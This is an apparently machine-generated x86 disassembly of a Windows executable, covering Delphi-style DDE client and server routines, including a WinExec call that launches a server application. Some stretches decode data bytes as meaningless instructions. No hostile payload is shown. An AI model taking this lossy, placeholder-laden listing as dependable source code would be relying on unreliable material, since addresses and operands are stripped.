xchg esp eax
inc ecx
add [ eax + 0x3d ] dl
inc ecx
add [ ebp + edx * 4 - 0x6b97ffbf ] bl
insd
cwde
in al 0x45
add [ ecx + 0x41 ] dh
add [ edx ] al
add [ esi ] al
inc esp
dec ebp
popad
outsb
add [ eax ] al
lea eax [ eax ]
pop esp
in eax 0x45
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp - 0x1a4fffbb ] cl
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + edi * 8 + 0x45 ] dh
in eax 0x45
add [ ecx + 0x41 ] dh
add [ edx ] al
add [ esi ] al
inc esp
dec ebp
popad
outsb
add [ eax ] al
lea eax [ eax ]
and dh ah
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] ch
inc ebp
add [ eax - 0x1a ] dl
inc ebp
add [ eax ] al
add [ eax ] al
sub_45e690
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
xor edx edx
push ebp
push sub_45e782
push [ fs : edx ]
mov [ fs : edx ] esp
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e789
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_403fb4
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fb4
retn
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeGetLastError
mov ebx eax
mov eax ebx
add eax 0xffffbff9
sub eax 0x2
jb r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405a90
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x0
lea edx [ ebp - 0x10 ]
xor ecx ecx
call sub_408a04
jmp r-xdata
dec eax
je r-xdata
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b284
call sub_4039cc
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405a90
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x0
lea edx [ ebp - 0x10 ]
xor ecx ecx
call sub_408a04
jmp r-xdata
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405a90
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x0
lea edx [ ebp - 0x10 ]
xor ecx ecx
call sub_408a04
sub_45e790
push ebp
mov ebp esp
add esp 0xffffff9c
push ebx
push esi
push edi
mov ebx [ ebp + 0x10 ]
mov esi [ ebp + 0x8 ]
xor edi edi
mov eax esi
sub eax 0x1062
je r-xdata
mov ecx [ ebp + 0x14 ]
mov edx [ ebp + 0x18 ]
mov eax [ rw-data ]
call sub_45eb38
mov edi eax
and edi 0x7f
jmp r-xdata
sub eax 0x1080
je r-xdata
test ebx ebx
je r-xdata
mov ecx [ ebp + 0x14 ]
mov edx [ ebp + 0x18 ]
mov eax [ rw-data ]
call sub_45ebec
mov edi eax
jmp r-xdata
sub eax 0x5f90
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x20
mov [ ebp - 0x64 ] 0x60
cmp esi 0x8080
jne r-xdata
mov eax [ ebp + 0x24 ]
push eax
mov ecx [ ebp + 0x14 ]
mov edx ebx
mov eax [ rw-data ]
call sub_45ec50
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp esi 0x4050
jg r-xdata
lea eax [ ebp - 0x64 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push ebx
call DdeQueryConvInfo
test eax eax
je r-xdata
sub esi 0x4090
je r-xdata
je r-xdata
mov esi [ ebp - 0x60 ]
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x14 ]
mov edx ebx
mov eax esi
call sub_4605f8
mov edi eax
jmp r-xdata
sub esi 0x3fb0
je r-xdata
mov esi [ ebp - 0x60 ]
mov eax [ ebp + 0x1c ]
push eax
mov ecx [ ebp + 0x14 ]
mov edx ebx
mov eax esi
call sub_4606ac
mov edi eax
jmp r-xdata
sub esi 0x1030
je r-xdata
mov esi [ ebp - 0x60 ]
mov eax [ ebp + 0x18 ]
push eax
mov ecx [ ebp + 0x14 ]
mov edx ebx
mov eax esi
call sub_4605c8
jmp r-xdata
sub esi 0x40
je r-xdata
mov esi [ ebp - 0x60 ]
mov eax [ ebp + 0x18 ]
push eax
mov ax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x14 ]
mov edx ebx
mov eax esi
call sub_460494
mov edi eax
and edi 0x7f
jmp r-xdata
sub esi 0xff2
je r-xdata
mov eax [ ebp - 0x60 ]
test eax eax
je r-xdata
sub esi 0x42
je r-xdata
mov esi [ ebp - 0x60 ]
mov eax [ ebp + 0x18 ]
push eax
mov ax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x14 ]
mov edx ebx
mov eax esi
call sub_4606cc
mov edi eax
jmp r-xdata
sub esi 0x8e
je r-xdata
call sub_45f838
jmp r-xdata
mov ebx [ ebp - 0x60 ]
test ebx ebx
je r-xdata
jmp r-xdata
mov esi [ ebp - 0x60 ]
mov eax [ ebp + 0x18 ]
push eax
mov ax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x14 ]
mov edx ebx
mov eax esi
call sub_4606cc
mov edi eax
jmp r-xdata
sub esi 0x1f60
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov eax [ ebp - 0x60 ]
mov ecx [ ebp + 0x18 ]
mov edx [ ebp + 0x1c ]
call sub_45f884
jmp r-xdata
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_45ed34
mov eax ebx
call sub_45f840
jmp r-xdata
sub_45e9a0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_45ea54
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_41914c
push r-xdata
call RegisterClipboardFormatA
mov [ esi + 0x48 ] ax
xor eax eax
mov [ esi + 0x44 ] eax
push 0x0
push 0x0
push sub_45e790
lea eax [ esi + 0x44 ]
push eax
call DdeInitializeA
test eax eax
sete al
call sub_45e690
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ esi + 0x38 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ esi + 0x3c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ esi + 0x40 ] eax
lea edx [ ebp - 0x4 ]
xor eax eax
call sub_4029e4
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_45ed7c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ea5b
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
add esp 0xfffffff0
call sub_403564
sub_45ea7d
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
push ebp
call sub_4035cc
mov ebx edx
mov ebp eax
mov eax [ ebp + 0x38 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x3c ]
test eax eax
je r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x40 ]
test eax eax
je r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x38 ]
call sub_403258
xor eax eax
mov [ ebp + 0x38 ] eax
inc esi
xor edi edi
mov eax ebp
call sub_45ee30
mov eax [ ebp + 0x44 ]
push eax
call DdeUninitialize
xor eax eax
mov [ rw-data ] eax
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_419198
test bl bl
jle r-xdata
call sub_403258
xor eax eax
mov [ ebp + 0x40 ] eax
mov eax [ ebp + 0x3c ]
call sub_403258
xor eax eax
mov [ ebp + 0x3c ] eax
inc esi
xor edi edi
mov eax [ ebp + 0x38 ]
mov edx edi
call sub_4137ac
call sub_403258
inc edi
dec esi
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_4035b4
mov eax [ ebp + 0x3c ]
mov edx edi
call sub_4137ac
call sub_403258
inc edi
dec esi
jne r-xdata
sub_45eb38
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_45ebdc
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
test esi esi
je r-xdata
push 0x3ec
push 0x1000
lea eax [ ebp - 0x1008 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ edi + 0x44 ]
push eax
call DdeQueryStringA
mov ecx eax
lea edx [ ebp - 0x1008 ]
lea eax [ ebp - 0x8 ]
call sub_404080
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_45ee5c
test eax eax
je r-xdata
mov eax [ edi + 0x34 ]
push eax
push esi
call DdeCmpStringHandles
test eax eax
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_45eeac
test eax eax
je r-xdata
mov bl 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ebe3
lea eax [ ebp - 0x8 ]
call sub_403f90
retn
mov bl 0x1
sub_45ebec
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov esi ecx
mov ebp edx
mov ebx eax
xor edi edi
test esi esi
je r-xdata
mov eax edi
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx esi
mov edx ebp
mov eax ebx
call sub_45eb38
cmp al 0x1
jne r-xdata
mov eax [ ebx + 0x34 ]
mov [ esp ] eax
mov [ esp + 0x4 ] esi
xor eax eax
mov [ esp + 0x8 ] eax
xor eax eax
mov [ esp + 0xc ] eax
push 0x0
push 0x1
push 0x0
push 0x0
push 0x10
lea eax [ esp + 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeCreateDataHandle
mov edi eax
sub_45ec50
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_45ed21
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_4603cc
mov ebx eax
push 0x3ec
push 0x1000
lea eax [ ebp - 0x1008 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ esi + 0x44 ]
push eax
call DdeQueryStringA
mov ecx eax
lea edx [ ebp - 0x1008 ]
lea eax [ ebp - 0x8 ]
call sub_404080
lea eax [ ebx + 0x30 ]
mov edx [ ebp - 0x8 ]
call sub_403fe4
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_45ee5c
mov [ ebx + 0x3c ] eax
cmp [ ebx + 0x3c ] 0x0
jne r-xdata
mov [ ebx + 0x40 ] edi
push ebx
push 0xffffffff
push edi
call DdeSetUserHandle
mov edx ebx
mov eax [ esi + 0x38 ]
call sub_413650
mov eax [ ebx + 0x3c ]
test eax eax
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_45eeac
mov [ ebx + 0x38 ] eax
mov bl 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ed28
lea eax [ ebp - 0x8 ]
call sub_403f90
retn
mov si 0xffef
call sub_403454
sub_45ed34
push ebx
push esi
push edi
mov edi eax
mov ebx edx
mov eax [ ebx + 0x3c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x40 ]
test eax eax
je r-xdata
mov si 0xffee
call sub_403454
xor eax eax
mov [ ebx + 0x40 ] eax
mov eax [ edi + 0x38 ]
test eax eax
je r-xdata
push 0x0
push 0xffffffff
push eax
call DdeSetUserHandle
pop edi
pop esi
pop ebx
retn
mov edx ebx
call sub_4138f0
mov eax ebx
call sub_403258
sub_45ed7c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45ee18
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_45ee30
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_408254
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x30 ]
call sub_403fe4
mov edx [ ebx + 0x30 ]
mov eax r-xdata
call sub_404594
mov esi eax
test esi esi
je r-xdata
push 0x3ec
mov eax [ ebx + 0x30 ]
call sub_404450
push eax
mov eax [ ebx + 0x44 ]
push eax
call DdeCreateStringHandleA
mov esi eax
mov [ ebx + 0x34 ] esi
push 0x1
push 0x0
push esi
mov eax [ ebx + 0x44 ]
push eax
call DdeNameService
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ee1f
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
mov eax [ ebx + 0x30 ]
call sub_404250
mov ecx eax
lea eax [ ebx + 0x30 ]
mov edx esi
call sub_4044f0
sub_45ee30
push ebx
mov ebx eax
mov eax [ ebx + 0x34 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebx + 0x34 ] eax
pop ebx
retn
push 0x2
push 0x0
push eax
mov eax [ ebx + 0x44 ]
push eax
call DdeNameService
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebx + 0x44 ]
push eax
call DdeFreeStringHandle
sub_45ee5c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov ebp eax
xor eax eax
mov [ esp + 0x4 ] eax
mov eax [ ebp + 0x40 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ esp + 0x4 ] ebx
jmp r-xdata
mov eax [ ebp + 0x40 ]
mov edx edi
call sub_4137ac
mov ebx eax
mov edx [ esp ]
mov eax [ ebx + 0x8 ]
call sub_407be4
test eax eax
jne r-xdata
sub_45eeac
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
xor eax eax
push ebp
push sub_45ef2e
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_456050
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ef35
lea eax [ ebp - 0xc ]
call sub_403f90
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ ebp - 0x8 ] ebx
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx edi
call sub_45603c
mov ebx eax
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_438a40
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_407be4
test eax eax
jne r-xdata
sub_45ef40
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov ebp eax
xor eax eax
mov [ esp + 0x4 ] eax
mov eax [ ebp + 0x38 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ esp + 0x4 ] ebx
jmp r-xdata
mov eax [ ebp + 0x38 ]
mov edx edi
call sub_4137ac
mov ebx eax
mov edx [ esp ]
mov eax [ ebx + 0x30 ]
call sub_407be4
test eax eax
jne r-xdata
sub_45ef90
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_404440
xor eax eax
push ebp
push sub_45efe7
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax ebx
call sub_45ef40
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45efee
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
mov edx [ ebp - 0x4 ]
call sub_4608b4
test eax eax
je r-xdata
call sub_460a98
sub_45f014
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41914c
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ esi + 0x9c ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403564
mov eax esi
pop esi
pop ebx
retn
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
sub_45f05c
push ebx
push esi
call sub_4035cc
mov ebx edx
mov esi eax
mov eax esi
call sub_45f6a0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419198
mov eax [ esi + 0x9c ]
call sub_403258
xor eax eax
mov [ esi + 0x9c ] eax
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035b4
sub_45f09c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4194c4
push ebx
push sub_45f16c
push ebx
push r-xdata
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov cl 0x1
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
xor ecx ecx
jmp r-xdata
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop esi
pop ebx
retn
sub_45f0e9
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_45f160
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41959c
lea eax [ ebp - 0x4 ]
mov edx [ ebx + 0x30 ]
call sub_404028
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x34 ]
call sub_404028
mov eax [ ebp - 0x4 ]
call sub_404250
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f167
cmp [ ebx + 0xc5 ] 0x1
je r-xdata
push 0x0
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_45f45c
sub_45f16c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi edx
mov edi eax
xor eax eax
push ebp
push j_sub_403994#9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_4175dc
jmp r-xdata
mov eax esi
call sub_416678
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_41827c
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_404594
mov ebx eax
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_404250
mov ecx eax
sub ecx ebx
lea edx [ ebx + 0x1 ]
mov eax [ ebp - 0x4 ]
call sub_4044b0
mov eax [ ebp - 0x4 ]
mov al [ eax ]
sub al 0x53
je r-xdata
mov eax esi
call sub_4175e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f21e
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fb4
retn
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_45f944
jmp r-xdata
dec al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_45f958
jmp r-xdata
sub_45f22b
inc [ ecx ]
add [ eax ] al
add [ eax ] ah
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push j_sub_403994#8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_418e28
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x30 ]
call sub_404028
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x10 ]
xor ecx ecx
mov eax r-xdata
call sub_408a04
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_418ed0
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x34 ]
call sub_404028
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x10 ]
xor ecx ecx
mov eax r-xdata
call sub_408a04
mov edx [ ebp - 0x14 ]
mov eax ebx
call sub_418ed0
mov eax ebx
call sub_418e30
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f2ee
lea eax [ ebp - 0x14 ]
call sub_403f90
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fb4
retn
sub_45f31c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_45fc30
mov esi eax
mov eax [ ebx + 0x9c ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_413828
mov [ esi + 0x10 ] edi
xor edx edx
mov eax esi
call sub_45fca0
pop edi
pop esi
pop ebx
retn
sub_45f354
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_45f414
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
xor edx edx
mov eax ebx
call sub_45fca0
mov edx ebx
mov eax [ esi + 0x9c ]
call sub_4138f0
mov eax ebx
call sub_403258
sub_45f38c
push ebx
push esi
push edi
push ebp
push ecx
mov ebp ecx
mov edi edx
mov esi eax
mov [ esp ] 0x1
mov edx edi
mov eax esi
call sub_45f414
mov ebx eax
test ebx ebx
jne r-xdata
test ebx ebx
je r-xdata
mov eax ebp
call sub_404250
test eax eax
jle r-xdata
test ebx ebx
je r-xdata
mov eax ebp
call sub_404250
test eax eax
jne r-xdata
mov edx edi
mov eax esi
call sub_45f31c
mov edx edi
mov eax esi
call sub_45f414
mov ebx eax
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebp
mov eax ebx
call sub_45fca0
mov [ esp ] al
cmp [ esp ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_45f354
jmp r-xdata
test [ esi + 0x1c ] 0x1
jne r-xdata
mov edx edi
mov eax esi
call sub_45f354
sub_45f414
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov esi eax
xor eax eax
mov [ esp + 0x4 ] eax
xor ebx ebx
jmp r-xdata
movzx ebp bx
mov edi [ esi + 0x9c ]
cmp ebp [ edi + 0x8 ]
jl r-xdata
mov edx ebp
mov eax edi
call sub_4137ac
mov edx [ eax + 0x10 ]
cmp edx [ esp ]
jne r-xdata
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
mov [ esp + 0x4 ] eax
jmp r-xdata
sub_45f45c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov eax esi
call sub_45f6a0
mov edx ebx
mov eax esi
call sub_45f944
mov edx edi
mov eax esi
call sub_45f958
mov eax esi
call sub_45f4ac
mov ebx eax
test bl bl
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
xor edx edx
mov eax esi
call sub_45f944
xor edx edx
mov eax esi
call sub_45f958
sub_45f4ac
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x108 ] edx
mov edi eax
xor eax eax
push ebp
push sub_45f682
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x0
cmp [ edi + 0x38 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f689
lea eax [ ebp - 0x108 ]
call sub_403f90
retn
mov eax [ edi + 0x30 ]
call sub_404250
test eax eax
jne r-xdata
cmp [ edi + 0xa0 ] 0x0
jne r-xdata
mov eax [ edi + 0x34 ]
call sub_404250
test eax eax
jne r-xdata
cmp [ edi + 0xa4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x101 ]
mov edx [ edi + 0x30 ]
call sub_4083d4
push 0x3ec
lea eax [ ebp - 0x101 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeCreateStringHandleA
mov [ edi + 0xa0 ] eax
mov eax edi
call sub_45f720
jmp r-xdata
mov ecx [ edi + 0xa4 ]
mov edx [ edi + 0xa0 ]
mov eax edi
call sub_45f760
mov ebx eax
test bl bl
jne r-xdata
lea eax [ ebp - 0x101 ]
mov edx [ edi + 0x34 ]
call sub_4083d4
push 0x3ec
lea eax [ ebp - 0x101 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeCreateStringHandleA
mov [ edi + 0xa4 ] eax
test bl bl
jne r-xdata
mov eax [ edi + 0x30 ]
call sub_404250
test eax eax
jne r-xdata
mov eax [ edi + 0x58 ]
test eax eax
je r-xdata
mov eax edi
call sub_45f720
jmp r-xdata
mov eax [ edi + 0xc0 ]
call sub_404250
test eax eax
je r-xdata
mov eax [ edi + 0xc0 ]
call sub_404250
test eax eax
je r-xdata
mov [ edi + 0xa8 ] 0x1
mov [ edi + 0xa8 ] eax
jmp r-xdata
push [ edi + 0x30 ]
push r-xdata
push [ edi + 0x34 ]
lea eax [ ebp - 0x108 ]
mov edx 0x3
call sub_404310
mov edx [ ebp - 0x108 ]
lea eax [ ebp - 0x101 ]
call sub_4083d4
lea eax [ ebp - 0x101 ]
mov edx [ edi + 0xc0 ]
call sub_4083d4
jmp r-xdata
mov eax edi
mov si 0xffee
call sub_403454
xor ecx ecx
xor edx edx
mov eax edi
call sub_45f884
mov [ ebp - 0x1 ] 0x1
mov eax edi
call sub_45f7d8
test al al
je r-xdata
mov ecx [ edi + 0xa4 ]
mov edx [ edi + 0xa0 ]
mov eax edi
call sub_45f760
mov ebx eax
push 0x7
lea eax [ ebp - 0x101 ]
push eax
call WinExec
cmp eax 0x20
jb r-xdata
sub_45f6a0
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xa0 ]
test eax eax
je r-xdata
mov esi eax
mov eax ebx
call sub_45f840
xor eax eax
mov [ ebx + 0x38 ] eax
push 0x0
push 0xffffffff
push esi
call DdeSetUserHandle
push esi
call DdeDisconnect
mov eax [ ebx + 0xa4 ]
test eax eax
je r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeFreeStringHandle
xor eax eax
mov [ ebx + 0xa0 ] eax
xor edx edx
mov eax ebx
call sub_45f944
xor edx edx
mov eax ebx
call sub_45f958
pop esi
pop ebx
retn
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeFreeStringHandle
xor eax eax
mov [ ebx + 0xa4 ] eax
sub_45f720
push ebx
push esi
mov esi eax
mov eax [ esi + 0x9c ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov bx [ eax + 0x8 ]
dec ebx
test bx bx
jb r-xdata
inc ebx
mov eax [ esi + 0x9c ]
xor edx edx
call sub_4137ac
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ eax + 0x10 ]
call sub_45fb1c
dec bx
jne r-xdata
sub_45f760
push ebx
push esi
push edi
push ebp
add esp 0xffffffdc
mov ebp ecx
mov edi edx
mov esi eax
mov eax esp
xor ecx ecx
mov edx 0x24
call sub_402c64
mov [ esp ] 0x24
mov [ esp + 0xc ] 0x3ec
push esp
push ebp
push edi
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeConnect
mov ebx eax
mov [ esi + 0x38 ] ebx
test ebx ebx
setne al
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x24
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x3c ] 0x60
lea eax [ esi + 0x3c ]
push eax
push 0xffffffff
mov eax [ esi + 0x38 ]
push eax
call DdeQueryConvInfo
push esi
push 0xffffffff
mov eax [ esi + 0x38 ]
push eax
call DdeSetUserHandle
sub_45f7d8
push ebx
push esi
push edi
push ebp
mov esi eax
xor eax eax
cmp [ esi + 0x38 ] 0x0
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
xor ebx ebx
jmp r-xdata
movzx ebp bx
mov edi [ esi + 0x9c ]
cmp ebp [ edi + 0x8 ]
jl r-xdata
mov edx ebp
mov eax edi
call sub_4137ac
mov edi eax
mov eax edi
call sub_45fea0
test al al
jne r-xdata
mov al 0x1
inc ebx
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ edi + 0x10 ]
call sub_45fb1c
jmp r-xdata
movzx eax bx
mov edx [ esi + 0x9c ]
cmp eax [ edx + 0x8 ]
jge r-xdata
sub_45f840
push ebx
push esi
push edi
push ebp
mov edi eax
cmp [ edi + 0x38 ] 0x0
je r-xdata
xor eax eax
mov [ edi + 0x38 ] eax
xor ebx ebx
